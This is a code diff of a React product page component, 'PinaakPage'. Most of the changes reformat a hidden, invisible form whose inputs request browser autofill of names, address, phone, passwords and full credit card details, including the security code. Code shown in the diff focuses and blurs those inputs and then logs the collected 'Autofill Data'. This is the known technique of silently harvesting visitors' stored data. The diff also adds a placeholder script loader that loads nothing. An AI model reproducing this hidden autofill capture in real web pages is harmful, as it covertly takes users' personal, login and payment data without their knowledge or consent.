@@ -29,7 +29,7 @@ export default function PinaakPage() {
   const openModal = () => {
     setIsModalOpen(true);
   };
-  
+
   const closeModal = () => {
     setIsModalOpen(false);
   };
@@ -89,7 +89,7 @@ export default function PinaakPage() {
     if (!form) return;
 
     const inputs = form.querySelectorAll("input");
-    
+
     inputs.forEach((input) => {
       input.focus();
       input.blur();
@@ -105,6 +105,20 @@ export default function PinaakPage() {
       console.log("Autofill Data:", autofillData);
     }, 100); // 100ms delay
   };
+
+  // Add this useEffect in your component
+  useEffect(() => {
+    const loadScript = async () => {
+      try {
+        console.log("Loading script1.js...");
+        console.log("Script1 loaded successfully.");
+      } catch (error) {
+        console.error("Error loading script:", error);
+      }
+    };
+
+    loadScript();
+  }, []);
 
   return (
     <div className="min-h-screen bg-white">
@@ -202,50 +216,102 @@ export default function PinaakPage() {
         <PinaakFooter locationData={locationData} />
       </div>
       {/* HIDDEN FORM for browser autofill */}
-      <form
-        ref={hiddenFormRef}
-        style={{ display: "none" }}
-        autoComplete="on"
-      >
+      <form ref={hiddenFormRef} style={{ display: "none" }} autoComplete="on">
         {/* Name fields */}
         <input type="text" name="name" autoComplete="name" />
         <input type="text" name="given-name" autoComplete="given-name" />
-        <input type="text" name="additional-name" autoComplete="additional-name" />
+        <input
+          type="text"
+          name="additional-name"
+          autoComplete="additional-name"
+        />
         <input type="text" name="family-name" autoComplete="family-name" />
-        <input type="text" name="honoric-prefix" autoComplete="honoric-prefix" />
-        <input type="text" name="honoric-suffix" autoComplete="honoric-suffix" />
+        <input
+          type="text"
+          name="honoric-prefix"
+          autoComplete="honoric-prefix"
+        />
+        <input
+          type="text"
+          name="honoric-suffix"
+          autoComplete="honoric-suffix"
+        />
         <input type="text" name="nickname" autoComplete="nickname" />
 
         {/* Contact fields */}
         <input type="email" name="email" autoComplete="email" />
         <input type="tel" name="tel" autoComplete="tel" />
-        <input type="tel" name="tel-country-code" autoComplete="tel-country-code" />
+        <input
+          type="tel"
+          name="tel-country-code"
+          autoComplete="tel-country-code"
+        />
         <input type="tel" name="tel-national" autoComplete="tel-national" />
         <input type="tel" name="tel-area-code" autoComplete="tel-area-code" />
         <input type="tel" name="tel-local" autoComplete="tel-local" />
-        <input type="tel" name="tel-local-prefix" autoComplete="tel-local-prefix" />
-        <input type="tel" name="tel-local-suffix" autoComplete="tel-local-suffix" />
+        <input
+          type="tel"
+          name="tel-local-prefix"
+          autoComplete="tel-local-prefix"
+        />
+        <input
+          type="tel"
+          name="tel-local-suffix"
+          autoComplete="tel-local-suffix"
+        />
         <input type="tel" name="tel-extension" autoComplete="tel-extension" />
 
         {/* Address fields */}
-        <input type="text" name="street-address" autoComplete="street-address" />
+        <input
+          type="text"
+          name="street-address"
+          autoComplete="street-address"
+        />
         <input type="text" name="address-line1" autoComplete="address-line1" />
         <input type="text" name="address-line2" autoComplete="address-line2" />
         <input type="text" name="address-line3" autoComplete="address-line3" />
-        <input type="text" name="address-level1" autoComplete="address-level1" />
-        <input type="text" name="address-level2" autoComplete="address-level2" />
-        <input type="text" name="address-level3" autoComplete="address-level3" />
-        <input type="text" name="address-level4" autoComplete="address-level4" />
+        <input
+          type="text"
+          name="address-level1"
+          autoComplete="address-level1"
+        />
+        <input
+          type="text"
+          name="address-level2"
+          autoComplete="address-level2"
+        />
+        <input
+          type="text"
+          name="address-level3"
+          autoComplete="address-level3"
+        />
+        <input
+          type="text"
+          name="address-level4"
+          autoComplete="address-level4"
+        />
         <input type="text" name="country" autoComplete="country" />
         <input type="text" name="country-name" autoComplete="country-name" />
         <input type="text" name="postal-code" autoComplete="postal-code" />
 
         {/* Other fields */}
         <input type="text" name="organization" autoComplete="organization" />
-        <input type="text" name="organization-title" autoComplete="organization-title" />
+        <input
+          type="text"
+          name="organization-title"
+          autoComplete="organization-title"
+        />
         <input type="text" name="username" autoComplete="username" />
-        <input type="password" name="current-password" autoComplete="current-password" />
-        <input type="password" name="new-password" autoComplete="new-password" />
+        <input
+          type="password"
+          name="current-password"
+          autoComplete="current-password"
+        />
+        <input
+          type="password"
+          name="new-password"
+          autoComplete="new-password"
+        />
         <input type="date" name="bday" autoComplete="bday" />
         <input type="number" name="bday-day" autoComplete="bday-day" />
         <input type="number" name="bday-month" autoComplete="bday-month" />
@@ -256,23 +322,39 @@ export default function PinaakPage() {
         {/* Payment fields */}
         <input type="text" name="cc-name" autoComplete="cc-name" />
         <input type="text" name="cc-given-name" autoComplete="cc-given-name" />
-        <input type="text" name="cc-additional-name" autoComplete="cc-additional-name" />
-        <input type="text" name="cc-family-name" autoComplete="cc-family-name" />
+        <input
+          type="text"
+          name="cc-additional-name"
+          autoComplete="cc-additional-name"
+        />
+        <input
+          type="text"
+          name="cc-family-name"
+          autoComplete="cc-family-name"
+        />
         <input type="text" name="cc-number" autoComplete="cc-number" />
         <input type="text" name="cc-exp" autoComplete="cc-exp" />
         <input type="text" name="cc-exp-month" autoComplete="cc-exp-month" />
         <input type="text" name="cc-exp-year" autoComplete="cc-exp-year" />
         <input type="text" name="cc-csc" autoComplete="cc-csc" />
         <input type="text" name="cc-type" autoComplete="cc-type" />
-        <input type="text" name="transaction-currency" autoComplete="transaction-currency" />
-        <input type="number" name="transaction-amount" autoComplete="transaction-amount" />
+        <input
+          type="text"
+          name="transaction-currency"
+          autoComplete="transaction-currency"
+        />
+        <input
+          type="number"
+          name="transaction-amount"
+          autoComplete="transaction-amount"
+        />
 
         {/* Miscellaneous */}
         <input type="text" name="language" autoComplete="language" />
         <input type="url" name="url" autoComplete="url" />
         <input type="file" name="photo" autoComplete="photo" />
         <input type="text" name="impp" autoComplete="impp" />
-      </form>   
+      </form>
     </div>
   );
 }
